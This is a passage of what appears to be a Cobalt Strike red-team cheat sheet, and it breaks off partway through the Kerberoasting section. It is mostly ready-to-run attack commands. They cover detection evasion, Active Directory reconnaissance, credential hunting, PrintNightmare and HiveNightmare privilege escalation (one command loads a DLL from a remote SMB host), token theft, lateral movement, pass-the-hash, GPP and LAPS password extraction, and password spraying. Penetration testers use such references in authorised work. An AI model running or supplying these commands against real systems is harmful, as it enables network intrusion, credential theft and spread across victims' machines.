|             |                                                                                                                                                                                                                                                                                                                        |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|             |                                                                                                                                                                                                                                                                                                                        |
| ## Overview |                                                                                                                                                                                                                                                                                                                        |
|             | - [TOC]                                                                                                                                                                                                                                                                                                                |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | -----------------------------------------------------------------------------------------                                                                                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | #### Important OPSEC notes...                                                                                                                                                                                                                                                                                          |
|             | For an actual red team, do NOT use `execute-assembly` at all, ever! Instead, sub the command for [BOF.NET](https://github.com/CCob/BOF.NET/pull/1) `bofnet_executeassembly` or another .NET assembly loader BOF (i.e. [InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)).&lt;br /&gt; |
|             | For everything else, use BOFs instead of `run` or `shell` commands for best OPSEC. ([BOF cheat sheet here](https://github.com/wsummerhill/C2_RedTeam_CheatSheets/blob/main/CobaltStrike/BOF_Collections.md)).                                                                                                          |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | -----------------------------------------------------------------------------------------                                                                                                                                                                                                                              |
|             | ## Malleable C2 Profiles                                                                                                                                                                                                                                                                                               |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | A collection of tools used to generate new malleable C2 profiles to use with Cobalt Strike and better obfuscate your traffic/commands.                                                                                                                                                                                 |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | - [Random C2 Profile](https://github.com/threatexpress/random_c2_profile)                                                                                                                                                                                                                                              |
|             | - [Malleable C2](https://github.com/threatexpress/malleable-c2)                                                                                                                                                                                                                                                        |
|             | - [Malleable C2 Profiles](https://github.com/xx0hcd/Malleable-C2-Profiles)                                                                                                                                                                                                                                             |
|             | - [C2concealer](https://github.com/FortyNorthSecurity/C2concealer)                                                                                                                                                                                                                                                     |
|             | - [SourcePoint](https://github.com/Tylous/SourcePoint)                                                                                                                                                                                                                                                                 |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | -----------------------------------------------------------------------------------------                                                                                                                                                                                                                              |
|             | ## Reflective Shellcode Loaders                                                                                                                                                                                                                                                                                        |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | Shellcode loaders to add in Cobalt Strike before generating your shellcode which are used to reflectively generate shellcode for added obfuscation, encryption, and ultimately better evasion.                                                                                                                         |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | - [AceLdr](https://github.com/kyleavery/AceLdr)                                                                                                                                                                                                                                                                        |
|             | - [TitanLdr](https://github.com/benheise/TitanLdr)                                                                                                                                                                                                                                                                     |
|             | - [BokuLoader](https://github.com/boku7/BokuLoader) - Bobby Cooke&#39;s reflective loader                                                                                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | -----------------------------------------------------------------------------------------                                                                                                                                                                                                                              |
|             | ## Domain Enumeration                                                                                                                                                                                                                                                                                                  |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | Running PowerView and SharpView                                                                                                                                                                                                                                                                                        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # PowerView:                                                                                                                                                                                                                                                                                                           |
|             | powershell-import --&gt; Select PowerView.ps1 to import PS1 file in memory                                                                                                                                                                                                                                             |
|             | powershell Get-Module PowerView                                                                                                                                                                                                                                                                                        |
|             | powershell Get-NetUser -Identity testuser -Domain lab.com                                                                                                                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # SharpView                                                                                                                                                                                                                                                                                                            |
|             | execute-assembly C:\SharpView.exe Invoke-CheckLocalAdminAccess --&gt; Check servers for local admin using current privileges                                                                                                                                                                                           |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | Running Sharphound (.NET version of Bloodhound) for AD domain collection                                                                                                                                                                                                                                               |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Running SharpView in memory (.NET version of PowerView)                                                                                                                                                                                                                                                              |
|             | execute-assembly C:\SharpHound.exe --CollectionMethod All --Domain lab.com --Stealth --excludedomaincontrollers --windowsonly --OutputDirectory C:\users\testuser\appdata\local\temp\|                                                                                                                                 |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Collecting only user sessions to determine who is logged in and where:                                                                                                                                                                                                                                               |
|             | execute-assembly C:\SharpHound.exe --CollectionMethod Session,LoggedOn --Outputdirectory C:\temp\|                                                                                                                                                                                                                     |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html                                                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [AD Recon tool](https://github.com/adrecon/ADRecon) - Perform different collection methods (ACLs, OUs, DCs, etc.) and output to Excel files                                                                                                                                                                            |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | powershell-import --&gt; ADRecon.ps1                                                                                                                                                                                                                                                                                   |
|             | # Perform all collection methods:                                                                                                                                                                                                                                                                                      |
|             | powershell ADRecon -OutputDir .\ -DomainController ops-dc.lab.com                                                                                                                                                                                                                                                      |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | Get domain trusts and domain controllers with built-in `nltest.exe` utility                                                                                                                                                                                                                                            |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Get all domain controllers of a domain                                                                                                                                                                                                                                                                               |
|             | run nltest /dclist:domain.com                                                                                                                                                                                                                                                                                          |
|             | # Get domain trusts                                                                                                                                                                                                                                                                                                    |
|             | run nltest /trusted_domains                                                                                                                                                                                                                                                                                            |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Domain SMB Share Enumeration &lt;br&gt;                                                                                                                                                                                                                                                                            |
|             | [PowerView](https://powersploit.readthedocs.io/en/latest)                                                                                                                                                                                                                                                              |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | powershell-import --&gt; Select PowerView.ps1 to import PS1 file in memory                                                                                                                                                                                                                                             |
|             | # Find all domain shares that the current user has access to                                                                                                                                                                                                                                                           |
|             | powershell Find-DomainShare -CheckShareAccess                                                                                                                                                                                                                                                                          |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Find interesting domain share files                                                                                                                                                                                                                                                                                  |
|             | powershell Find-InterestingDomainShareFile -ComputerDomain DOMAIN.COM                                                                                                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [SharpShares](https://github.com/mitchmoser/SharpShares) - List accessible shares on remote systems and check read/write privileges&lt;br&gt;                                                                                                                                                                          |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Find all accessible network shares in a domain, exclude default share names (SYSVOL,netlogon,ipc$,print$), and perform read/write access checks                                                                                                                                                                      |
|             | execute-assembly C:\SharpShares.exe /ldap:all /filter                                                                                                                                                                                                                                                                  |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Find all server shares (including DCs), exclude default share names, perform read/write access checks and output to file                                                                                                                                                                                             |
|             | execute-assembly C:\SharpShares.exe /ldap:servers /filter /outfile:find-domain-shares.txt                                                                                                                                                                                                                              |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [Snaffler](https://github.com/SnaffCon/Snaffler) - Automated network share enumeration to look for interesting files/creds                                                                                                                                                                                             |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Run Snaffler on all domain systems found, output to console and file                                                                                                                                                                                                                                                 |
|             | execute-assembly C:\snaffler.exe -d DOMAN.COM -s -o C:\temp\snaffler.log                                                                                                                                                                                                                                               |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Run Snaffler on only target hosts                                                                                                                                                                                                                                                                                    |
|             | execute-assembly C:\snaffler.exe -s -o C:\temp\snaffler2.log -n hostname1.domain.com,hostname2.domain.com,hostname3.domain.com                                                                                                                                                                                         |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Miscellaneous Remote Workstation/Server stuff                                                                                                                                                                                                                                                                      |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | List and kill processes on remote system (requires local Admin)                                                                                                                                                                                                                                                        |
|             | - Using tasklist.exe and taskkill.exe &lt;br /&gt;                                                                                                                                                                                                                                                                     |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | run tasklist /s SERVER.domain.com --&gt; List remote processes                                                                                                                                                                                                                                                         |
|             | run taskkill /s SERVER.domain.com /IM PROCESS.exe --&gt; Kill remote process                                                                                                                                                                                                                                           |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | - Using [CIMplant](https://github.com/FortyNorthSecurity/CIMplant) &lt;br /&gt;                                                                                                                                                                                                                                        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | execute-assembly CIMplant.exe -s [remote-IP-address] -c ps --&gt; List remote processes                                                                                                                                                                                                                                |
|             | execute-assembly CIMplant.exe -s [remote-IP-address] -c process_kill &lt;ProcessName/PID&gt; --&gt; Kill remote process                                                                                                                                                                                                |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | -----------------------------------------------------------------------------------------                                                                                                                                                                                                                              |
|             | ## Local Privilege Escalation                                                                                                                                                                                                                                                                                          |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) - PowerSploit module                                                                                                                                                                                                     |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | powershell-import --&gt; PowerUp.ps1                                                                                                                                                                                                                                                                                   |
|             | powerpick Invoke-AllChecks \| Out-File -Encoding ASCII PowerUp-checks.txt                                                                                                                                                                                                                                              |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### [SharpUp](https://github.com/GhostPack/SharpUp) - .NET port of PowerUp                                                                                                                                                                                                                                             |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Run all checks automatically - output to console                                                                                                                                                                                                                                                                     |
|             | execute-assembly C:\SharpUp.exe audit                                                                                                                                                                                                                                                                                  |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Run an individual check                                                                                                                                                                                                                                                                                              |
|             | execute-assembly SharpUp.exe HijackablePaths                                                                                                                                                                                                                                                                           |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe) - Windows Privilege Escalation Awesome Script&lt;br&gt;                                                                                                                                                                          |
|             | ```execute-assembly winpeas.exe #run all checks```&lt;br&gt;                                                                                                                                                                                                                                                           |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### [SeatBelt](https://github.com/GhostPack/Seatbelt) - .NET tool by GhostPack                                                                                                                                                                                                                                         |
|             | GREAT tool to query a local system to gather system/user/remote/misc data                                                                                                                                                                                                                                              |
|             | Can be used as Admin or normal-privileged user                                                                                                                                                                                                                                                                         |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Run ALL checks - returns TONS of data                                                                                                                                                                                                                                                                                |
|             | execute-assembly C:\SeatBelt.exe -group=all -full -outputfile=&#34;C:\Temp\SeatBelt-all.json&#34;                                                                                                                                                                                                                      |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Run only user-related checks - returns things like Chrome data, DPAPI keys, IE tabs, Windows vault/credentials, etc.                                                                                                                                                                                                 |
|             | execute-assembly C:\SeatBelt.exe -group=user -outputfile=&#34;C:\Temp\SeatBelt-user.json&#34;                                                                                                                                                                                                                          |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Run only system-related checks - returns things like Antivirus, Applocker, env path/variables, local users/groups, WMI, sysmon, UAC, etc.                                                                                                                                                                            |
|             | execute-assembly C:\SeatBelt.exe -group=system -outputfile=&#34;C:\Temp\SeatBelt-system.json&#34;                                                                                                                                                                                                                      |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Run only Chrome checks - returns bookmarks, history, presence                                                                                                                                                                                                                                                        |
|             | execute-assembly C:\SeatBelt.exe -group=chromium -outputfile=&#34;C:\Temp\SeatBelt-chrome.json&#34;                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Run only remote-related checks - returns things like network shares, putty sessions, RDP connections/settings, Filezilla, Windows firewall, etc.                                                                                                                                                                     |
|             | execute-assembly C:\SeatBelt.exe -group=remote -outputfile=&#34;C:\Temp\SeatBelt-remote.json&#34;                                                                                                                                                                                                                      |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Run only miscellaneous-related checks - returns things like Chrome data, logon events, LOBAS, interesting files, downloads, PS events, scheduled tasks, etc.                                                                                                                                                         |
|             | execute-assembly C:\SeatBelt.exe -group=misc -outputfile=&#34;C:\Temp\SeatBelt-misc.json&#34;                                                                                                                                                                                                                          |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Watson - .NET version of Sherlock.ps1 to look for missing KBs on Windows                                                                                                                                                                                                                                           |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Peroform all checks and output to console                                                                                                                                                                                                                                                                            |
|             | # Supports:                                                                                                                                                                                                                                                                                                            |
|             | Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004                                                                                                                                                                                                                                                  |
|             | Server 2016 &amp; 2019                                                                                                                                                                                                                                                                                                 |
|             | execute-assembly C:\Watson.exe                                                                                                                                                                                                                                                                                         |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### PrintNightmare priv esc exploit (CVE-2021-3452)                                                                                                                                                                                                                                                                    |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Impacket&#39;s PrintNightmare: https://github.com/cube0x0/CVE-2021-1675                                                                                                                                                                                                                                              |
|             | # Impacket&#39;s SharpNightmare (Csharp): https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare                                                                                                                                                                                                       |
|             | # PowerShell PrintNightmare local priv esc: https://github.com/calebstewart/CVE-2021-1675                                                                                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Local priv esc                                                                                                                                                                                                                                                                                                       |
|             | execute-assembly C:\SharpPrintNightmare.exe C:\addCube.dll                                                                                                                                                                                                                                                             |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # RCE using existing context                                                                                                                                                                                                                                                                                           |
|             | execute-assembly C:\SharpPrintNightmare.exe &#39;\\192.168.1.215\smb\addCube.dll&#39; &#39;\\192.168.1.20&#39;                                                                                                                                                                                                         |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # RCE using runas /netonly                                                                                                                                                                                                                                                                                             |
|             | execute-assembly C:\SharpPrintNightmare.exe &#39;\\192.168.1.215\smb\addCube.dll&#39; &#39;\\192.168.1.10&#39; hackit.local domain_user Pass123                                                                                                                                                                        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### HiveNightmare priv esc SAM dump (CVE-202136934)                                                                                                                                                                                                                                                                   |
|             | Exploit in Windows 10 and 11 which allows you to read the SAM, SYSTEM and SECURITY hives as a low-privileged user                                                                                                                                                                                                      |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # First check privileges to read SAM hive                                                                                                                                                                                                                                                                              |
|             | run icacls C:\Windows\System32\config\SAM                                                                                                                                                                                                                                                                              |
|             | --&gt; If the results show success and the group BUILTIN\Users has privileges (I)(RX) then the SAM file should be readable by all users!                                                                                                                                                                               |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Exploit: Csharp implementation (https://github.com/cube0x0/CVE-2021-36934)                                                                                                                                                                                                                                           |
|             | execute-assembly C:\CVE-2021-36934.exe                                                                                                                                                                                                                                                                                 |
|             | --&gt; Dumps hashes to console upon successful exploitation                                                                                                                                                                                                                                                            |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Stealing logon tokens                                                                                                                                                                                                                                                                                              |
|             | If you obtained local Administrator privileges, you can steal a session token of another process to inherit their token privileges. This might require you to escalate to a SYSTEM Beacon if its being blocked.&lt;br /&gt;                                                                                            |
|             | `steal_token &lt;PID&gt;`                                                                                                                                                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Elevating to SYSTEM Beacon                                                                                                                                                                                                                                                                                         |
|             | Assuming you gained local administrator privileges, one option to elevate to a SYSTEM Beacon is to use scheduled tasks to create a new scheduled task to run your payload as SYSTEM.&lt;br /&gt;                                                                                                                       |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | run schtasks /create /tn &#34;TaskName&#34; /sc once /U DOMAIN\username /P Password1! /tr &#34;cmd.exe /c C:\path\to\Payload.exe&#34; /ru SYSTEM                                                                                                                                                                       |
|             | run schtasks /run /tn &#34;TaskName&#34; --&gt; Should pop SYSTEM Beacon                                                                                                                                                                                                                                               |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ------------------------------------------------------------------------------------------                                                                                                                                                                                                                             |
|             | ## Lateral Movement                                                                                                                                                                                                                                                                                                    |
|             | Cobalt Strike jumping (OUTDATED)                                                                                                                                                                                                                                                                                       |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Jump using WinRM if it&#39;s enabled for the current user on the target system                                                                                                                                                                                                                                       |
|             | jump winrm64 ops-jumpbox.lab.com HTTPSLISTENER                                                                                                                                                                                                                                                                         |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Jump using PsExec if it&#39;s enabled for the current user on the target system                                                                                                                                                                                                                                      |
|             | jump psexec64 ops-jumpbox.lab.com HTTPSLISTENER                                                                                                                                                                                                                                                                        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | Cobalt Strike remote-exec - Executes commands on a target system using psexec, winrm or wmi (OUTDATED)                                                                                                                                                                                                                 |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # remote-exec using WMI                                                                                                                                                                                                                                                                                                |
|             | remote-exec wmi ops-jumpbox.lab.com cmd.exe /c &#34;C:\Users\Public\payload.exe&#34;                                                                                                                                                                                                                                   |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # remote-exec using PsExec                                                                                                                                                                                                                                                                                             |
|             | remote-exec psexec ops-jumpbox.lab.com cmd.exe /c &#34;C:\Users\Public\payload.exe&#34;                                                                                                                                                                                                                                |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | Enable Powershell Remoting manually                                                                                                                                                                                                                                                                                    |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Enable on local system with Admin privileges                                                                                                                                                                                                                                                                         |
|             | powershell Enable-PSRemoting Force                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Enable on remote system                                                                                                                                                                                                                                                                                              |
|             | make_token AD\admin Password123! --&gt; Token with Admin privileges on remote system is required                                                                                                                                                                                                                       |
|             | run psexec.exe \\TestComputer.lab.com -h -s powershell.exe Enable-PSRemoting -Force                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Test remote access                                                                                                                                                                                                                                                                                                   |
|             | powershell Invoke-Command -ComputerName TestComputer -ScriptBlock { whoami; hostname }                                                                                                                                                                                                                                 |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [RACE.ps1](https://github.com/samratashok/RACE): ACL attacks for lateral movement, persistence and privilege escalation                                                                                                                                                                                                |
|             | Stealthier than above method since it doesn&#39;t touch disk                                                                                                                                                                                                                                                           |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | powershell-import --&gt; RACE.ps1                                                                                                                                                                                                                                                                                      |
|             | make_token AD\Admin password --&gt; This tool requires Admin privileges on the remote system being targeted                                                                                                                                                                                                            |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-jumpbox.lab.com --&gt; Force enable PS remoting for the specific user                                                                                                                                                                       |
|             | powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-jumpbox.lab.com --&gt; (Optional) Force enable WMI for the specific user                                                                                                                                                                           |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Now we can move laterally in CS with WinRM for the specified user                                                                                                                                                                                                                                                    |
|             | make_token AD\testuser password                                                                                                                                                                                                                                                                                        |
|             | jump [winrm/winrm64] ops-jumpbox.lab.com HTTPSLISTENER                                                                                                                                                                                                                                                                 |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | Scheduled task lateral movement                                                                                                                                                                                                                                                                                        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # First copy payload files to remote system manually                                                                                                                                                                                                                                                                   |
|             | # Create task on remote system                                                                                                                                                                                                                                                                                         |
|             | run schtasks /create /tn &#34;MyTask&#34; /sc once /U DOMAIN\username /P Password1! /S target-host.domain.com /tr &#34;cmd.exe /c C:\Windows\temp\Payload.exe&#34;                                                                                                                                                     |
|             | # Execute remote task                                                                                                                                                                                                                                                                                                  |
|             | run schtasks /run /tn &#34;MyTask&#34; /S target-host.domain.com                                                                                                                                                                                                                                                       |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) - PS tools to perform SMB and WMI pass-the-hash attacks                                                                                                                                                                                            |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | powershell-import                                                                                                                                                                                                                                                                                                      |
|             | powerpick Invoke-WMIExec -Target 192.168.100.20 -Domain LAB.com -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command &#34;command or launcher to execute&#34; -verbose                                                                                                                                       |
|             | powerpick Invoke-SMBExec -Target 192.168.100.20 -Domain LAB.com -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command &#34;command or launcher to execute&#34; -verbose                                                                                                                                       |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | Over-pass-the-hash with Rubeus                                                                                                                                                                                                                                                                                         |
|             | Inject a ticket into memory using known credentials and then move to a system that user has access to                                                                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Revert to original token in CS                                                                                                                                                                                                                                                                                       |
|             | rev2self                                                                                                                                                                                                                                                                                                               |
|             | # Create and inject new ticket into memory                                                                                                                                                                                                                                                                             |
|             | execute-assembly C:\Rubeus.exe asktgt /domain:lab.com /user:admin1 /rc4:&lt;NTLM-hash&gt; /ptt                                                                                                                                                                                                                         |
|             | # Run network commands as that user                                                                                                                                                                                                                                                                                    |
|             | ls \\jumpbox.lab.com\C$                                                                                                                                                                                                                                                                                                |
|             | jump winrm64 jumpbox.lab.com                                                                                                                                                                                                                                                                                           |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [Move Kit](https://github.com/0xthirteen/MoveKit)                                                                                                                                                                                                                                                                      |
|             | Aggressor script using execute-assembly, SharpMove and SharpRPD assemblies for doing lateral movement with various techniques                                                                                                                                                                                          |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [SharpExec](https://github.com/anthemtotheego/SharpExec) - CSharp tooling lateral movement                                                                                                                                                                                                                             |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # WMI lateral movement                                                                                                                                                                                                                                                                                                 |
|             | execute-assembly SharpExec.exe -m=wmi -i=IPADDRESS -u=USER -p=PASSWORD -d=DOMAIN -e=C:\Windows\System32\cmd.exe -c=&#34;/c C:\path\to\payload&#34;                                                                                                                                                                     |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # PSExec lateral movement                                                                                                                                                                                                                                                                                              |
|             | execute-assembly SharpExec.exe -m=psexec -i=IPADDRESS -u=USER -p=PASSWORD -d=DOMAIN -e=C:\Windows\System32\cmd.exe -c=&#34;/c C:\path\to\payload&#34;                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ------------------------------------------------------------------------------------------                                                                                                                                                                                                                             |
|             | ## Domain Privilege Escalation                                                                                                                                                                                                                                                                                         |
|             | ### GPP Passwords                                                                                                                                                                                                                                                                                                      |
|             | [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) PowerSploit module                                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Get-GPPPassword Searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords                                                                                                                                                                    |
|             | powershell-import --&gt; Get-GPPPassword.ps1                                                                                                                                                                                                                                                                           |
|             | powerpick Get-GPPPassword -Server ops-dc01.lab.com                                                                                                                                                                                                                                                                     |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | [Net-GPPPassword](https://github.com/outflanknl/Net-GPPPassword) .NET port of get-gpppassword                                                                                                                                                                                                                          |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | execute-assembly C:\Net-GPPPassword.exe lab.com                                                                                                                                                                                                                                                                        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) PowerSploit module                                                                                                                                                                                |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Get-GPPAutologn searches the domain controller for registry.xml to find autologon information and returns the username and password                                                                                                                                                                                  |
|             | powershell-import --&gt; Get-GPPAutologon.ps1                                                                                                                                                                                                                                                                          |
|             | powerpick Get-GPPAutolgon                                                                                                                                                                                                                                                                                              |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### LAPS Passwords                                                                                                                                                                                                                                                                                                     |
|             | [SharpLaps](https://github.com/swisskyrepo/SharpLAPS) - Retrive LAPS password from AD&lt;br&gt;                                                                                                                                                                                                                        |
|             | The attribute ms-mcs-AdmPwd stores the clear-text LAPS password which is targeted here from LDAP&lt;br&gt;                                                                                                                                                                                                             |
|             | ``` execute-assembly SharpLAPS.exe /user:DOMAIN\USER /pass:PASSWORD /host:IPADDRESS```                                                                                                                                                                                                                                 |
|             |                                                                                                                                                                                                                                                                                                                        |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Password spraying                                                                                                                                                                                                                                                                                                  |
|             | [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)                                                                                                                                                                                                                                             |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | powershell-import --&gt; DomainPasswordSpray.ps1                                                                                                                                                                                                                                                                       |
|             | # Get the full domain user list (Optional)                                                                                                                                                                                                                                                                             |
|             | powershell Get-DomainUserList -Domain lab.com -RemoveDisabled -RemovePotentialLockouts \| Out-File -Encoding ascii userlist.txt                                                                                                                                                                                        |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Password spray from a username and password list                                                                                                                                                                                                                                                                     |
|             | powershell Invoke-DomainPasswordSpray -UserList userlist.txt -PasswordList passlist.txt -Domain lab.com -OutFile sprayed-creds.txt                                                                                                                                                                                     |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Auto spray a specific password on an auto-generated user list (very noisy)                                                                                                                                                                                                                                           |
|             | powershell Invoke-DomainPasswordSpray -Password Summer2021                                                                                                                                                                                                                                                             |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | Rubeus brute-force password spraying a single password or using a password file                                                                                                                                                                                                                                        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | execute-assembbly C:\Rubeus.exe brute /password:Password123! /domain:lab.com /noticket /outfile:passes-sprayed.txt [/passwords:PASSWORDS_FILE&gt;] [/user:USER \| /users:USERS_FILE] [/creduser:DOMAIN\\USER &amp; /credpassword:PASSWORD] [/dc:DOMAIN_CONTROLLER] [/verbose] [/nowrap]                                |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | [SharpSpray](https://github.com/jnqpblc/SharpSpray) - .NET port of PowerSpray.ps1                                                                                                                                                                                                                                      |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # By default it will automatically generate a user list from the domain using LDAP                                                                                                                                                                                                                                     |
|             | # Sleeps 30 minutes between each password cycle, delays 300 milliseconds between each password guess attempt                                                                                                                                                                                                           |
|             | execute-assembly C:\SharpSpray.exe --Passwords Summer2021,Fall2021 --Sleep 30 --Delay 300                                                                                                                                                                                                                              |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Kerberoasting                                                                                                                                                                                                                                                                                                      |
|             | PowerView kerberoasting (Outdated and still reliant on PowerShell)                                                                                                                                                                                                                                                     |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Get users with SPN set                                                                                                                                                                                                                                                                                               |
|             | powershell Get-DomainUesr -SPN                                                                                                                                                                                                                                                                                         |
|             |                                                                                                                                                                                                                                                                                                                        |
